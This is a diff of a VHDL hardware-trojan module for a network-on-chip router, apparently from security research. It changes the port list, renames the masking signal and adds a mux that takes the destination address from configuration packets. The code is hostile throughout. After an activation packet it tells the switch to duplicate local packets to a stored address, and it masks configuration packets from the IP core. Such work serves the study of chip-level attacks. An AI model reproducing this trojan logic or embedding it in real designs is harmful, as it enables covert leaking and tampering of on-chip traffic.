@@ -14,30 +14,14 @@ entity HardwareTrojan is
     port(
         clock : 		in std_logic;
         reset :	 		in std_logic;
-        
-        data_in :	 	in regflit; 	-- to read the information on the local port
-        destAddr :      in regmetadeflit;
+        data_in :	 	in regflit;         -- to read the information on the local port
+        destAddr :      in arrayNport_regmetadeflit;
         dupFlit :       out regflit;
         sending:        in std_logic;
-
-        --Switch Control Interface
-        duplicate : 	out std_logic; 	-- to inform the SW that the packet must be duplicated
-    	free : 			in regNport;
-		mux_in :	 	in arrayNport_reg3;
-		mux_out : 		in arrayNport_reg3;
-
-        --Buffers Interface
-        configPckt : 	in regNport; -- informs the presence of a config packet inside the buffer
-
-        --Crossbar Interface
-        creditIn : 		in regNport;
-        data_out : 		out regflit; 	-- to output the malicious addr
-        dataSel	:		out std_logic; 	-- to select which flit will go through the crossbar
-
-        --Local Buffer Interface
-        maskPkg_o :     out std_logic;
-        h :             in std_logic;
-        turnOff :       in regNport
+        duplicate : 	out std_logic;      -- to inform the SW that the packet must be duplicated
+        configPckt : 	in regNport;        -- informs the presence of a config packet inside the buffer
+        turnOff :       in regNport;
+        maskPckt_o :     out std_logic
         );
 end HardwareTrojan;
 
@@ -45,8 +29,8 @@ architecture HardwareTrojan of HardwareTrojan is
 
 type HTState is (S0, waiting, readDestination, waitHeader, transmitting);
 signal state : HTState;
-signal destination : regmetadeflit;
-signal maskPkg, turnOff_or : std_logic;
+signal destination, dest : regmetadeflit;
+signal maskPckt, turnOff_or : std_logic;
 
 begin
 
@@ -63,7 +47,7 @@ begin
 
                 -- Waiting the awakening packet
                 when waiting =>
-                    if maskPkg = '0' and turnOff_or = '0' then -- trocar para pckt
+                    if maskPckt = '0' and turnOff_or = '0' then -- trocar para pckt
                         state <= readDestination;
                     else
                         state <= waiting;
@@ -71,7 +55,7 @@ begin
 
                 -- Stores the Destination address to replace it in the duplicated packet
                 when readDestination =>
-                    destination <= destAddr;
+                    destination <= dest;
                     state <= waitHeader;
 
                 -- Waits until the LOCAL IP send a new packet
@@ -105,12 +89,16 @@ begin
     -- Informa o Switch Control que ele deve rotear os próximos pacotes locais para duas saídas
     duplicate <= '1' when state = waitHeader or state = transmitting else '0';
 
-    data_out <= (others=> '0');
-    dataSel <= '0';
-
     -- Mascara o pacote de configuração para o IP!
-    maskPkg <= '0' when configPckt(0) = '1' or configPckt(1) = '1' or configPckt(2) = '1' or configPckt(3) = '1' or configPckt(4) = '1' or turnOff_or = '1' else '1';
+    maskPckt <= '0' when configPckt(0) = '1' or configPckt(1) = '1' or configPckt(2) = '1' or configPckt(3) = '1' or configPckt(4) = '1' or turnOff_or = '1' else '1';
     turnOff_or <= '1' when turnOff(0) = '1' or turnOff(1) = '1' or turnOff(2) = '1' or turnOff(3) = '1' or turnOff(4) = '1' else '0';
-    maskPkg_o <= maskPkg;
+    maskPckt_o <= maskPckt;
+
+    -- Mux to define the address source
+    dest <= destAddr(0) when configPckt(0) = '1' else
+            destAddr(1) when configPckt(1) = '1' else
+            destAddr(2) when configPckt(2) = '1' else
+            destAddr(3) when configPckt(3) = '1' else
+            destAddr(4);
 
 end HardwareTrojan;
